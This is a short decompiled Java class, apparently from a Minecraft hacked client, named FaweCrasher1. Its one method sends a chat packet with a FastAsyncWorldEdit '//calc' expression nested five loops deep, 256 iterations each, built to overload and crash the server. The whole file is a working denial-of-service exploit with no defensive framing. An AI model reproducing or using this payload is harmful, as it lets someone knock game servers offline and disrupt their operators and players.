// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.fawe;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraft.client.Minecraft;

public class FaweCrasher1
{
    public static void start() {
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){for(m=0;m<256;m++){ln(pi)}}}}}"));
    }
}
